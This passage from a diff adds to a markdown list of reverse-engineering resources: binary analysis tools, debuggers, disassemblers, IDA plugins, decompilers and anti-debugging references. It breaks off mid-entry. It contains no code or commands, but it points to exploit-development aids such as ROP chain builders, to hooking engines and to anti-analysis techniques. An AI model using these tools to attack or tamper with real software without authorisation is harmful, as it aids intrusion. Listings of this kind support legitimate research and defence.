+  * [The Best Campfire Tales that Reverse Engineers Tell - Travis Goodspeed with Sergey Bratus](https://www.youtube.com/watch?v=l39OVRDvN9w)
+  * [Jailbreaks and Pirate Tractors: Reverse Engineering Do’s and Don’ts](https://www.youtube.com/watch?v=8_mMTVsOM6Y)
+  * [Introduction to Reversing and Pwning - David Weinman - BsidesLV ProvingGrounds17](https://www.youtube.com/watch?v=4rjWlOvbz7U&app=desktop)
+
+### Things that are interesting/don't fit elsewhere
+
+* Code Tools
+
+  * [SyntaxHighlighter](http://alexgorbatchev.com/SyntaxHighlighter/)
+    * SyntaxHighlighter is a fully functional self-contained code syntax
+      highlighter developed in JavaScript. To get an idea of what
+      SyntaxHighlighter is capable of, have a look at the demo page.
+  * [linguist](https://github.com/github/linguist)
+    * Language Savant. If your repository's language is being reported
+      incorrectly, send us a pull request!
+  * [Ohcount - Ohloh's source code line counter.](https://github.com/blackducksoftware/ohcount)
+  * [Detecting programming language from a snippet](https://stackoverflow.com/questions/475033/detecting-programming-language-from-a-snippet)
+
+* Comparison Tools
+
+  * [binwally](https://github.com/bmaia/binwally)
+    * Binary and Directory tree comparison tool using the Fuzzy Hashing concept
+      (ssdeep)
+  * [Using binwally - a directory tree diff tool](http://w00tsec.blogspot.com/2013/12/binwally-directory-tree-diff-tool-using.html)
+
+* References
+
+  * [FCC ID Lookup](http://transition.fcc.gov/oet/ea/fccid/)
+    * Lookup devices according to FCC ID
+  * [x86 opcode structure and instruction overview](http://pnx.tf/files/x86_opcode_structure_and_instruction_overview.pdf)
+
+### General Research/Stuff
+
+* [TAMPER (Tamper And Monitoring Protection Engineering Research)](http://www.cl.cam.ac.uk/research/security/tamper/)
+
+  * In the TAMPER Lab, we study existing security products, document how they
+    have been penetrated in the past, develop new attack techniques, and try to
+    forecast how newly available technologies will make it easier to bypass
+    hardware security mechanisms. We then develop and evaluate new
+    countermeasures and assist industrial designers in staying ahead of the
+    game, most of all by giving them an advanced understanding of which attack
+    techniques are most dangerous. We are especially interested in protection
+    systems for mass-market applications, and in forensic applications.
+
+### Tools
+
+* Binary Visualization Tools
+
+  * [binglide](https://github.com/wapiflapi/binglide)
+    * binglide is a visual reverse engineering tool. It is designed to offer a
+      quick overview of the different data types that are present in a file.
+      This tool does not know about any particular file format, everything is
+      done using the same analysis working on the data. This means it works even
+      if headers are missing or corrupted or if the file format is unknown.
+  * [binvis.io](http://binvis.io/#/)
+    * visual analysis of binary files
+  * [cantor.dust](https://sites.google.com/site/xxcantorxdustxx/home)
+    * a powerful, dynamic, interactive binary visualization tool
+
+- General
+
+  * [Binwalk](https://github.com/devttys0/binwalk)
+    * Binwalk is a fast, easy to use tool for analyzing, reverse engineering,
+      and extracting firmware images.
+  * [Pip3line, the Swiss army knife of byte manipulation](https://nccgroup.github.io/pip3line/index.html)
+    * Pip3line is a raw bytes manipulation utility, able to apply well known and
+      less well known transformations from anywhere to anywhere (almost).
+  * [Frida](http://www.frida.re/docs/home/)
+    * Inject JS into native apps
+  * [Binacle](https://github.com/ANSSI-FR/Binacle)
+    * Indexation "full-bin" of binary files
+  * [Construct2](https://github.com/construct/construct)
+    * Construct is a powerful declarative parser (and builder) for binary data.
+      Instead of writing imperative code to parse a piece of data, you
+      declaratively define a data structure that describes your data. As this
+      data structure is not code, you can use it in one direction to parse data
+      into Pythonic objects, and in the other direction, convert ("build")
+      objects into binary data.
+
+- De/Obfuscators/Unpackers
+
+  * [de4dot](https://github.com/0xd4d/de4dot)
+    * de4dot is an open source (GPLv3) .NET deobfuscator and unpacker written in
+      C#. It will try its best to restore a packed and obfuscated assembly to
+      almost the original assembly. Most of the obfuscation can be completely
+      restored (eg. string encryption), but symbol renaming is impossible to
+      restore since the original names aren't (usually) part of the obfuscated
+      assembly.
+  * [Universal Extractor](http://www.legroom.net/software/uniextract)
+    * Universal Extractor is a program designed to decompress and extract files
+      from any type of archive or installer, such as ZIP or RAR files,
+      self-extracting EXE files, application installers, etc
+  * [Stunnix C/C++ Obfuscator](http://stunnix.com/prod/cxxo/)
+  * [asar](https://github.com/electron/asar)
+    * Simple extensive tar-like archive format with indexing
+
+- ELF/Related Tools
+
+  * [Rdis](https://github.com/endeav0r/rdis)
+    * Rdis is a Binary Analysis Tool for Linux.
+  * [readelf](https://sourceware.org/binutils/docs/binutils/readelf.html)
+    * Unix Tool
+
+- Emulators
+
+  * [Unicorn-Engine](http://www.unicorn-engine.org/)
+    * Unicorn is a lightweight multi-platform, multi-architecture CPU emulator
+      framework.
+  * [pegasus - Windbg extension DLL for emulation](https://github.com/0a777h/pegasus)
+    * Windbg emulation plugin
+
+- PE32/Related Tools
+
+  * [Dependency Walker](http://www.dependencywalker.com/)
+    * Dependency Walker is a free utility that scans any 32-bit or 64-bit
+      Windows module (exe, dll, ocx, sys, etc.) and builds a hierarchical tree
+      diagram of all dependent modules. For each module found, it lists all the
+      functions that are exported by that module, and which of those functions
+      are actually being called by other modules. Another view displays the
+      minimum set of required files, along with detailed information about each
+      file including a full path to the file, base address, version numbers,
+      machine type, debug information, and more.
+  * [PPEE(puppy)](https://www.mzrst.com/#top)
+    * Professional PE file Explorer for reversers, malware researchers and those
+      who want to statically inspect PE files in more details. Free and fast.
+  * [PEStudio](http://www.winitor.com/)
+    * pestudio is a tool that performs the static analysis of 32-bit and 64-bit
+      Windows executable files. Malicious executable attempts to hide its
+      malicious intents and to evade detection. In doing so, it generally
+      presents anomalies and suspicious patterns. The goal of pestudio is to
+      detect these anomalies, provide indicators and score the executable being
+      analyzed. Since the executable file being analyzed is never started, you
+      can inspect any unknown or malicious executable with no risk.
+  * [PEview](http://wjradburn.com/software/)
+    * PEview provides a quick and easy way to view the structure and content of
+      32-bit Portable Executable (PE) and Component Object File Format (COFF)
+      files. This PE/COFF file viewer displays header, section, directory,
+      import table, export table, and resource information within EXE, DLL, OBJ,
+      LIB, DBG, and other file types.
+
+- OLE
+
+  * [python-oletools](https://github.com/decalage2/oletools)
+    * python-oletools is a package of python tools to analyze Microsoft OLE2
+      files (also called Structured Storage, Compound File Binary Format or
+      Compound Document File Format), such as Microsoft Office documents or
+      Outlook messages, mainly for malware analysis, forensics and debugging. It
+      is based on the olefile parser. See
+      http://www.decalage.info/python/oletools for more info.
+
+* Searching Through Binaries
+
+  * [bingrep](https://github.com/m4b/bingrep)
+    * Greps through binaries from various OSs and architectures, and colors
+      them.
+
+* Static Analysis Tools
+
+  * [Bindead - static binary binary analysis tool](https://bitbucket.org/mihaila/bindead/wiki/Home)
+    * Bindead is an analyzer for executable machine code. It features a
+      disassembler that translates machine code bits into an assembler like
+      language (RREIL) that in turn is then analyzed by the static analysis
+      component using abstract interpretation.
+  * [Static binary analysis tool](https://github.com/bdcht/amoco)
+    * Amoco is a python package dedicated to the (static) analysis of binaries.
+      Worth a check on the Github
+  * [Statically Linked Library Detector](https://github.com/arvinddoraiswamy/slid)
+
+* OS X
+
+  * [Instruments - OS X system analysis](https://developer.apple.com/library/mac/documentation/DeveloperTools/Conceptual/InstrumentsUserGuide/Introduction/Introduction.html)
+    * Instruments is a performance-analysis and testing tool for dynamically
+      tracing and profiling OS X and iOS code. It is a flexible and powerful
+      tool that lets you track a process, collect data, and examine the
+      collected data. In this way, Instruments helps you understand the behavior
+      of both user apps and the operating system.
+  * [Reversing iOS/OS X](http://newosxbook.com/forum/viewforum.php?f=8)
+
+* Linux
+
+  * [Statically Linked Library Detector](https://github.com/arvinddoraiswamy/slid)
+  * [Rdis](https://github.com/endeav0r/rdis)
+    * Rdis is a Binary Analysis Tool for Linux.
+
+* Windows
+
+  * [PolyHook - x86/x64 Hooking Library](https://github.com/stevemk14ebr/PolyHook)
+    * Provides abstract C++ 11 interface for various hooking methods
+  * [EasyHook](https://easyhook.github.io/)
+    * EasyHook makes it possible to extend (via hooking) unmanaged code APIs
+      with pure managed functions, from within a fully managed environment on
+      32- or 64-bit Windows XP SP2, Windows Vista x64, Windows Server 2008 x64,
+      Windows 7, Windows 8.1, and Windows 10.
+  * [Microsoft Message Analyzer](http://www.microsoft.com/en-us/download/details.aspx?id=40308)
+    * Microsoft Message Analyzer is a new tool for capturing, displaying, and
+      analyzing protocol messaging traffic and other system messages. Message
+      Analyzer also enables you to import, aggregate, and analyze data from log
+      and trace files. It is the successor to Microsoft Network Monitor 3.4 and
+      a key component in the Protocol Engineering Framework (PEF) that was
+      created by Microsoft for the improvement of protocol design, development,
+      documentation, testing, and support. With Message Analyzer, you can choose
+      to capture data live or load archived message collections from multiple
+      data sources simultaneously.
+  * [API Monitor](http://www.rohitab.com/apimonitor)
+    * API Monitor is a free software that lets you monitor and control API calls
+      made by applications and services. Its a powerful tool for seeing how
+      applications and services work or for tracking down problems that you have
+      in your own applications.
+  * [SpyStudio](http://www.nektra.com/products/spystudio-api-monitor/)
+    * SpyStudio shows and interprets calls, displaying the results in a
+      structured way which is easy for any IT professional to understand.
+      SpyStudio can show registry keys and files that an application uses, COM
+      objects and Windows the application has created, and errors and
+      exceptions.
+    * [SpyStudio Tutorials](http://whiteboard.nektra.com/spystudio-2-0-quickstart)
+  * [Fibratus](https://github.com/rabbitstack/fibratus)
+    * Fibratus is a tool which is able to capture the most of the Windows kernel
+      activity - process/thread creation and termination, file system I/O,
+      registry, network activity, DLL loading/unloading and much more. Fibratus
+      has a very simple CLI which encapsulates the machinery to start the kernel
+      event stream collector, set kernel event filters or run the lightweight
+      Python modules called filaments. You can use filaments to extend Fibratus
+      with your own arsenal of tools.
+  * [Deviare2](https://github.com/nektra/Deviare2)
+    * Deviare is a professional hooking engine for instrumenting arbitrary Win32
+      functions, COM objects, and functions whose symbols are located in program
+      databases (PDBs). It can intercept unmanaged code in 32-bit and 64-bit
+      applications. It is implemented as a COM component, so it can be
+      integrated with all the programming languages which support COM, such as
+      C/C++, VB, C#, Delphi, and Python.
+  * [Deviare In-Proc](https://github.com/nektra/Deviare-InProc)
+    * Deviare In-Proc is a code interception engine for Microsoft Windows®
+      developed by Nektra Advanced Computing. This library is at the core of our
+      Deviare v2.0 and SpyStudio Application Monitor technologies. Deviare is an
+      alternative to Microsoft Detours® but with a dual license distribution.
+      The library is coded in C++ and provides all the facilities required to
+      instrument binary libraries during runtime. It includes support for both
+      32 and 64 bit applications and it implements the interception verifying
+      different situations that can crash the process. If you need to intercept
+      any Win32 functions or any other code, this library makes it easier than
+      ever. Unlike the rest of the libraries, Deviare In-Proc provides a safe
+      mechanism to implement multi-threaded application API hooking. When an
+      application is running, more than one thread can be executing the code
+      being intercepted. Deviare In-Proc provides safe hooking even in this
+      scenario.
+
+#### Debuggers
+
+* All platforms
+
+  * [Voltron](https://github.com/snare/voltron)
+    * Voltron is an extensible debugger UI toolkit written in Python. It aims to
+      improve the user experience of various debuggers (LLDB, GDB, VDB and
+      WinDbg) by enabling the attachment of utility views that can retrieve and
+      display data from the debugger host. By running these views in other TTYs,
+      you can build a customised debugger user interface to suit your needs.
+  * [GDB - GNU Debugger](https://www.gnu.org/software/gdb/)
+    * GDB, the GNU Project debugger, allows you to see what is going on `inside'
+      another program while it executes -- or what another program was doing at
+      the moment it crashed.
+  * GDB Addons
+    * [PEDA](https://github.com/longld/peda)
+      * PEDA - Python Exploit Development Assistance for GDB
+    * [gdbgui](https://github.com/cs01/gdbgui)
+      * A modern, browser-based frontend to gdb (gnu debugger). Add breakpoints,
+        view stack traces, and more in C, C++, Go, and Rust. Simply run gdbgui
+        from the terminal and a new tab will open in your browser.
+    * [GEF - GDB Enhanced Features](https://github.com/hugsy/gef)
+      * GEF is aimed to be used mostly by exploiters and reverse-engineers. It
+        provides additional features to GDB using the Python API to assist
+        during the process of dynamic analysis or exploit development. Why not
+        PEDA? Yes!! Why not?! PEDA is a fantastic tool to do the same, but is
+        only to be used for x86-32 or x86-64. On the other hand, GEF supports
+        all the architecture supported by GDB (x86, ARM, MIPS, PowerPC, SPARC,
+        and so on).
+      * [Docs](https://gef.readthedocs.org/en/latest/)
+
+* Linux
+
+  * [PulseDBG](https://github.com/honorarybot/PulseDBG)
+    * Hypervisor-based debugger
+  * [xnippet](https://github.com/isislab/xnippet)
+    * xnippet is a tool that lets you load code snippets or isolated functions
+      (no matter the operating system they came from), pass parameters to it in
+      several formats (signed decimal, string, unsigned hexadecimal...), hook
+      other functions called by the snippet and analyze the result. The tool is
+      written in a way that will let me improve it in a future, defining new
+      calling conventions and output argument pointers.
+
+* OS X
+* Windows
+
+  * [OllyDbg](http://www.ollydbg.de/)
+    * OllyDbg is a 32-bit assembler level analysing debugger for Microsoft®
+      Windows®. Emphasis on binary code analysis makes it particularly useful in
+      cases where source is unavailable.
+    * [OllyDbg Tricks for Exploit Development](http://resources.infosecinstitute.com/in-depth-seh-exploit-writing-tutorial-using-ollydbg/)
+  * [WinDbg](https://msdn.microsoft.com/en-us/library/windows/hardware/ff551063%28v=vs.85%29.aspx)
+    * [Excellent Resource Site](http://www.windbg.org/)
+    * [Crash Dump Analysis Poster](http://www.dumpanalysis.org/CDAPoster.html)
+    * [Getting Started with WinDbg (User-Mode)](https://msdn.microsoft.com/en-us/library/windows/hardware/dn745911%28v=vs.85%29.aspx)
+    * [Getting Started with WinDbg (Kernel-Mode)](https://msdn.microsoft.com/en-us/library/windows/hardware/dn745912%28v=vs.85%29.aspx)
+    * [REhints MEX - WinDBG addons](https://github.com/REhints/WinDbg/tree/master/MEX)
+  * [WinAppDbg](http://winappdbg.sourceforge.net/)
+    * The WinAppDbg python module allows developers to quickly code
+      instrumentation scripts in Python under a Windows environment. It uses
+      ctypes to wrap many Win32 API calls related to debugging, and provides a
+      powerful abstraction layer to manipulate threads, libraries and processes,
+      attach your script as a debugger, trace execution, hook API calls, handle
+      events in your debugee and set breakpoints of different kinds (code,
+      hardware and memory). Additionally it has no native code at all, making it
+      easier to maintain or modify than other debuggers on Windows. The intended
+      audience are QA engineers and software security auditors wishing to test
+      or fuzz Windows applications with quickly coded Python scripts. Several
+      ready to use tools are shipped and can be used for this purposes. Current
+      features also include disassembling x86/x64 native code, debugging
+      multiple processes simultaneously and produce a detailed log of
+      application crashes, useful for fuzzing and automated testing.
+  * [Open Source Windows x86/x64 Debugger](http://x64dbg.com/)
+  * [HyperDbg](https://github.com/rmusser01/hyperdbg/)
+    * HyperDbg is a kernel debugger that leverages hardware-assisted
+      virtualization. More precisely, HyperDbg is based on a minimalistic
+      hypervisor that is installed while the system runs. Compared to
+      traditional kernel debuggers (e.g., WinDbg, SoftIce, Rasta R0 Debugger)
+      HyperDbg is completely transparent to the kernel and can be used to debug
+      kernel code without the need of serial (or USB) cables. For example,
+      HyperDbg allows to single step the execution of the kernel, even when the
+      kernel is executing exception and interrupt handlers. Compared to
+      traditional virtual machine based debuggers (e.g., the VMware builtin
+      debugger), HyperDbg does not require the kernel to be run as a guest of a
+      virtual machine, although it is as powerful.
+    * [Paper](http://roberto.greyhats.it/pubs/ase10.pdf)
+
+- Debugging Writeups/Papers
+
+  * [BugNet: Continuously Recording Program Execution for Deterministic Replay Debugging](https://cseweb.ucsd.edu/~calder/papers/ISCA-05-BugNet.pdf)
+  * [Back to the Future: Omniscient Debugging](https://pleiad.cl/papers/2009/pothierTanter-software2009.pdf)
+  * [A REVIEW OF REVERSE DEBUGGING - Jakob Engblom (2012?)](http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.338.3420&rep=rep1&type=pdf)
+  * [Binary Hooking Problems](http://www.ragestorm.net/blogs/?p=348)
+  * [Hyper-V debugging for beginners](http://hvinternals.blogspot.com/2015/10/hyper-v-debugging-for-beginners.html?m=1)
+
+#### Decompilers & Disassemblers
+
+* Java
+
+  * [Procyon - Java Decompiler](https://bitbucket.org/mstrobel/procyon/wiki/Java%20Decompiler)
+
+* General
+
+  * [IDA](https://www.hex-rays.com/products/ida/)
+    * IDA Pro combines an interactive, programmable, multi-processor
+      disassembler coupled to a local and remote debugger and augmented by a
+      complete plugin programming environment.
+    * [Overview & Tutorials](https://www.hex-rays.com/products/ida/debugger/index.shtml)
+  * [fREedom](capstone based disassembler for extracting to binnavi )
+    * fREedom is a primitive attempt to provide an IDA Pro independent means of
+      extracting disassembly information from executables for use with binnavi
+      (https://github.com/google/binnavi).
+  * [Hopper](http://www.hopperapp.com/)
+    * Hopper is a reverse engineering tool for OS X and Linux, that lets you
+      disassemble, decompile and debug your 32/64bits Intel Mac, Linux, Windows
+      and iOS executables!
+  * [Reverse](https://github.com/joelpx/reverse)
+    * Reverse engineering for x86 binaries (elf-format). Generate a more
+      readable code (pseudo-C) with colored syntax. Warning, the project is
+      still in development, use it at your own risks. This tool will try to
+      disassemble one function (by default main). The address of the function,
+      or its symbol, can be passed by argument.
+  * [Medusa](https://github.com/wisk/medusa)
+
+    * Medusa is a disassembler designed to be both modular and interactive. It
+      runs on Windows and Linux, it should be the same on OSX. This project is
+      organized as a library. To disassemble a file you have to use medusa_dummy
+      or qMedusa. wxMedusa and pydusa are not available anymore.
+
+* .NET
+
+  * [DotPeek](http://www.jetbrains.com/decompiler/features/)
+    * dotPeek is a .NET decompiler that has several handy features.
+
+* IDA specific Stuff
+
+  * IDA Extensions
+    * [BAP-IDA](https://github.com/BinaryAnalysisPlatform/bap-ida-python)
+      * This package provides the necessary IDAPython scripts required for
+        interoperatibility between BAP and IDA Pro. It also provides many useful
+        feature additions to IDA, by leveraging power from BAP.
+    * [funcap - IDA Pro script to add some useful runtime info to static analysis.](https://github.com/deresz/funcap)
+      * This script records function calls (and returns) across an executable
+        using IDA debugger API, along with all the arguments passed. It dumps
+        the info to a text file, and also inserts it into IDA's inline comments.
+        This way, static analysis that usually follows the behavioral runtime
+        analysis when analyzing malware, can be directly fed with runtime info
+        such as decrypted strings returned in function's arguments. In author's
+        opinion this allows to understand the program's logic way faster than
+        starting the "zero-knowledge" reversing. Quick understanding of a
+        malware sample code was precisely the motivation to write this script
+        and the author has been using it succesfully at his $DAYJOB. It is best
+        to see the examples with screenshots to see how it works (see below). It
+        must be noted that the script has been designed with many
+        misconceptions, errors and bad design decisions (see issues and
+        funcap.py code) as I was learning when coding but it has one advantage -
+        it kind of works :) Current architectures supported are x86, amd64 and
+        arm.
+        [IDAPython Embedded Toolkit](https://github.com/maddiestone/IDAPythonEmbeddedToolkit)
+      * IDAPython is a way to script different actions in the IDA Pro
+        disassembler with Python. This repository of scripts automates many
+        different processes necessary when analyzing the firmware running on
+        microcontroller and microprocessor CPUs. The scripts are written to be
+        easily modified to run on a variety of architectures. Read the
+        instructions in the header of each script to determine what ought to be
+        modified for each architecture.
+  * IDA Plugins
+    * [A list of IDA Plugins](https://github.com/onethawt/idaplugins-list)
+    * [IDA Python - Ero Carrera](http://www.offensivecomputing.net/papers/IDAPythonIntro.pdf)
+      * IDAPython is an extension for IDA , the Interactive Disassembler . It
+        brings the power and convenience of Python scripting to aid in the
+        analysis of binaries. This article will cover some basic usage and
+        provide examples to get interested individuals started. W e will walk
+        through practical examples ranging from iterating through functions,
+        segments and instructions to data mining the binaries, collecting
+        references and analyzing their structure.
+    * [Kam1n0-Plugin-IDA-Pro](https://github.com/McGill-DMaS/Kam1n0-Plugin-IDA-Pro)
+      * Kam1n0 is a scalable system that supports assembly code clone search. It
+        allows a user to first index a (large) collection of binaries, and then
+        search for the code clones of a given target function or binary file.
+        Kam1n0 tries to solve the efficient subgraph search problem (i.e. graph
+        isomorphism problem) for assembly functions. Given a target function
+        (the middle one in the figure below) it can identity the cloned
+        subgraphs among other functions in the repository (the ones on the left
+        and the right as shown below). Kam1n0 supports rich comment format and
+        has an IDA Pro plug-in to use its indexing and searching capabilities
+        via IDA Pro.
+    * [FLARE-Ida](https://github.com/fireeye/flare-ida)
+      * This repository contains a collection of IDA Pro scripts and plugins
+        used by the FireEye Labs Advanced Reverse Engineering (FLARE) team.
+    * [toolbag](https://github.com/aaronportnoy/toolbag)
+      * The IDA Toolbag is a plugin providing supplemental functionality to
+        Hex-Rays IDA Pro disassembler.
+    * [Dynamic IDA Enrichment (aka. DIE)](https://github.com/ynvb/DIE)
+      * DIE is an IDA python plugin designed to enrich IDA`s static analysis
+        with dynamic data. This is done using the IDA Debugger API, by placing
+        breakpoints in key locations and saving the current system context once
+        those breakpoints are hit.
+    * [HexRaysCodeXplorer](https://github.com/REhints/HexRaysCodeXplorer)
+      * Hex-Rays Decompiler plugin for better code navigation in RE process of
+        C++ applications or code reconstruction of modern malware as Stuxnet,
+        Flame, Equation
+    * [Ida Pomidor](https://thesprawl.org/projects/ida-pomidor/)
+      * IDA Pomidor is a fun and simple plugin for the Hex-Ray's IDA Pro
+        disassembler that will help you retain concentration and productivity
+        during long reversing sessions.
+    * [idaConsonance](https://github.com/eugeii/ida-consonance)
+      * Consonance, a dark color theme for IDA.
+    * [Lighthouse - Code Coverage Explorer for IDA Pro](https://github.com/gaasedelen/lighthouse)
+      * Lighthouse is a code coverage plugin for IDA Pro. The plugin leverages
+        IDA as a platform to map, explore, and visualize externally collected
+        code coverage data when symbols or source may not be available for a
+        given binary.
+    * [NRS](https://github.com/isra17/nrs)
+      * NRS is a set of Python librairies used to unpack and analysis NSIS
+        installer's data. It also feature an IDA plugin used to disassembly the
+        NSIS Script of an installer
+    * [Ponce](https://github.com/illera88/Ponce)
+      * Ponce (pronounced [ 'poN ?e ] pon-they ) is an IDA Pro plugin that
+        provides users the ability to perform taint analysis and symbolic
+        execution over binaries in an easy and intuitive fashion. With Ponce you
+        are one click away from getting all the power from cutting edge symbolic
+        execution. Entirely written in C/C++.
+    * [IDASkins](https://github.com/zyantific/IDASkins)
+      * Advanced skinning plugin for IDA Pro
+    * [Ida Sploiter](https://thesprawl.org/projects/ida-sploiter/)
+      * IDA Sploiter is a plugin for Hex-Ray's IDA Pro disassembler designed to
+        enhance IDA's capabilities as an exploit development and vulnerability
+        research tool. Some of the plugin's features include a powerful ROP
+        gadgets search engine, semantic gadget analysis and filtering,
+        interactive ROP chain builder, stack pivot analysis, writable function
+        pointer search, cyclic memory pattern generation and offset analysis,
+        detection of bad characters and memory holes, and many others.
+    * [vtbl-ida-pro-plugin](https://github.com/nektra/vtbl-ida-pro-plugin)
+      * Identifying Virtual Table Functions using VTBL IDA Pro Plugin + Deviare
+        Hooking Engine
+    * [virusbattle-ida-plugin](https://github.com/moghimi/virusbattle-ida-plugin)
+      * The plugin is an integration of Virus Battle API to the well known IDA
+        Disassembler. Virusbattle is a web service that analyses malware and
+        other binaries with a variety of advanced static and dynamic analyses.
+  * IDA Tutorials/Help
+    * [TiGa's Video Tutorial Series on IDA Pro](http://woodmann.com/TiGa/idaseries.html)
+    * [IDA PLUG-IN WRITING IN C/C++](http://www.binarypool.com/idapluginwriting/idapw.pdf)
+    * [How to Identify Virtual Table Functions with IDA Pro and the VTBL Plugin](https://www.youtube.com/watch?v=XHW9Akb4KLI&app=desktop)
+    * [Reversing C++ programs with IDA pro and Hex-rays](https://blog.0xbadc0de.be/archives/67)
+    * [IDAPython The Wonder Woman of Embedded Device Reversing Maddie Stone - Derbycon7](https://www.youtube.com/watch?v=HRwfRrmPAHI&index=2&list=PLNhlcxQZJSm-PKUZTYe1C94ymf0omysM3)
+    * [IDA FLIRT In Depth](https://www.hex-rays.com/products/ida/tech/flirt/in_depth.shtml)
+
+#### File Formats
+
+* [Encyclopedia of Graphics File Formats](http://fileformats.archiveteam.org/wiki/Encyclopedia_of_Graphics_File_Formats)
+* [PE File Format Graphs](http://blog.dkbza.org/2012/08/pe-file-format-graphs.html?view=mosaic)
+* [PNG File Format](http://fileformats.archiveteam.org/wiki/PNG)
+* [Tour of Win32 Executable format](http://msdn.microsoft.com/en-us/magazine/ms809762.aspx)
+
+#### Flash Player
+
+* [#Fldbg](https://github.com/offensive-security/fldbg)
+  
+    * Fldbg, a Pykd script to debug FlashPlayer
+
+* [SWFRETools](https://github.com/sporst/SWFREtools)
+
+  * The SWFRETools are a collection of tools built for vulnerability analysis of
+    the Adobe Flash player and for malware analysis of malicious SWF files. The
+    tools are partly written in Java and partly in Python and are licensed under
+    the GPL 2.0 license.
+
+#### Frameworks
+
+* [angr](http://angr.io/)
+
+  * angr is a python framework for analyzing binaries. It focuses on both static
+    and dynamic symbolic ("concolic") analysis, making it applicable to a
+    variety of tasks.
+
+* [Radare2 - unix-like reverse engineering framework and commandline tools](http://www.radare.org/y/?p=features)
+
+  * Informally goal is to be best RE software framework
+  * [Github](https://github.com/radare/radare2)
+  * [Radare2 Book(free)](https://maijin.github.io/radare2book/index.html)
+  * [Radare2 Documentation](http://www.radare.org/y/?p=documentation)
+  * [Reverse engineering embedded software using Radare2 - Talk/Tutorial](https://www.youtube.com/watch?v=R3sGlzXfEkU)
+  * [Notes and Demos for above video](https://github.com/pastcompute/lca2015-radare2-tutorial)
+  * [radare2 cheat sheet](https://github.com/pwntester/cheatsheets/blob/master/radare2.md)
+  * [radare2 as an alternative to gdb-peda](https://monosource.github.io/2016/10/radare2-peda)
+  * [Radare2 in 0x1E minutes](https://blog.techorganic.com/2016/03/08/radare-2-in-0x1e-minutes/)
+
+* [BitBlaze](http://bitblaze.cs.berkeley.edu/)
+
+  * The BitBlaze project aims to design and develop a powerful binary analysis
+    platform and employ the platform in order to (1) analyze and develop novel
+    COTS protection and diagnostic mechanisms and (2) analyze, understand, and
+    develop defenses against malicious code. The BitBlaze project also strives
+    to open new application areas of binary analysis, which provides sound and
+    effective solutions to applications beyond software security and malicious
+    code defense, such as protocol reverse engineering and fingerprint
+    generation.
+
+* [Platform for Architecture-Neutral Dynamic Analysis](https://github.com/moyix/panda)
+* [BARF-Project](https://github.com/programa-stic/barf-project)
+
+  * BARF : A multiplatform open source Binary Analysis and Reverse engineering
+    Framework
+  * [Presentation: Barfing Gadgets - Ekoparty 2014](https://github.com/programa-stic/barf-project/raw/master/documentation/presentations/barfing-gadgets.ekoparty2014.es.pdf)
+
+#### Programming Language Specifics/Libraries
+
+* Libraries
+
+  * [openreil](https://github.com/Cr4sh/openreil)
+    * Open source library that implements translator and tools for REIL (Reverse
+      Engineering Intermediate Language)]
+  * [PortEx](https://github.com/katjahahn/PortEx)
+    * PortEx is a Java library for static malware analysis of Portable
+      Executable files. Its focus is on PE malformation robustness, and anomaly
+      detection. PortEx is written in Java and Scala, and targeted at Java
+      applications.
+  * [Equip: python bytecode instrumentation](https://github.com/neuroo/equip)
+    * equip is a small library that helps with Python bytecode instrumentation.
+      Its API is designed to be small and flexible to enable a wide range of
+      possible instrumentations. The instrumentation is designed around the
+      injection of bytecode inside the bytecode of the program to be
+      instrumented. However, the developer does not need to know anything about
+      the Python bytecode since the injected code is Python source.
+
+* GO
+
+  * [Reversing GO binaries like a pro](https://rednaga.io/2016/09/21/reversing_go_binaries_like_a_pro/)
+
+* Python
+
+  * Bytecode
+    * [Gynvael’s Mission 11 (en): Python bytecode reverse-engineering](https://chriswarrick.com/blog/2017/08/03/gynvaels-mission-11-en-python-bytecode-reverse-engineering/)
+    * [Deobfuscating Python Bytecode](https://www.fireeye.com/blog/threat-research/2016/05/deobfuscating_python.html)
+  * Decompiler
+    * [python-uncompyle6](https://github.com/rocky/python-uncompyle6)
+      * A Python cross-version decompiler
+    * [Decompyle++](https://github.com/zrax/pycdc)
+      * C++ python bytecode disassembler and decompiler
+    * [Python Decompiler](https://github.com/alex/python-decompiler)
+      * This project aims to create a comprehensive decompiler for CPython
+        bytecode (likely works with PyPy as well, and any other Python
+        implementation that uses CPython's bytecode)
+    * [PyInstaller Extractor](https://sourceforge.net/p/pyinstallerextractor/tickets/5/)
+      * Extract contents of a Windows executable file created by pyinstaller
+    * [Easy Python Decompiler](https://sourceforge.net/projects/easypythondecompiler/)
+      * Python 1.0 - 3.4 bytecode decompiler
+  * General
+    * [Python RE tools list](http://pythonarsenal.erpscan.com/)
+
+### Anti-Reverse Engineering Techniques & Countermeasures
+
+* Talks
+
+  * [Trolling reverse_engineers with math - frank^2 - part.mov](https://www.youtube.com/watch?v=y124L75ZKAc)
+
+* Techniques
+
+  * [The “Ultimate”Anti-Debugging Reference - Peter Ferrie 2011/4](http://pferrie.host22.com/papers/antidebug.pdf)
+  * [Android Reverse Engineering Defenses](https://bluebox.com/wp-content/uploads/2013/05/AndroidREnDefenses201305.pdf)
+  * [Anti-RE A collection of Anti-Reverse Engineering Techniques](http://pnx.tf/files/spring7_antire_plohmann_kannen.pdf)
+  * [Anti Reverse Engineering](http://www.codeproject.com/Articles/30815/An-Anti-Reverse-Engineering-Guide)
+  * [Fun combining anti-debugging and anti-disassembly tricks](http://blog.sevagas.com/?Fun-combining-anti-debugging-and)
+  * [simpliFiRE.AntiRE - An Executable Collection of Anti-Reversing Techniques](https://bitbucket.org/fkie_cd_dare/simplifire.antire)
+    * AntiRE is a collection of such anti analysis approaches, gathered from
+      various sources like Peter Ferrie's The "Ultimate" Anti-Debugging
+      Reference and Ange Albertini's corkami. While these techniques by
+      themselves are nothing new, we believe that the integration of these tests
+      in a single, executable file provides a comprehensive overview on these,
+      suitable for directly studying their behaviour in a harmless context
+      without additional efforts. AntiRE includes different techniques to detect
+      or circumvent debuggers, fool execution tracing, and disable memory
+      dumping. Furthermore, it can detect the presence of different
+      virtualization environments and gives examples of techniques used to
+      twarth static analysis.
+  * [OpenRCE Anti Reverse Engineering Techniques Database](http://www.openrce.org/reference_library/anti_reversing)
+  * [Windows Anti-Debugging Reference](http://www.symantec.com/connect/articles/windows-anti-debug-reference)
+    * This paper classifies and presents several anti-debugging techniques used
+      on Windows NT-based operating systems. Anti-debugging techniques are ways
+      for a program to detect if it runs under control of a debugger. They are
+      used by commercial executable protectors, packers and malicious software,
+      to prevent or slow-down the process of reverse-engineering. We'll suppose
+      the program is analyzed under a ring3 debugger, such as OllyDbg on Windows
+      platforms. The paper is aimed towards reverse-engineers and malware
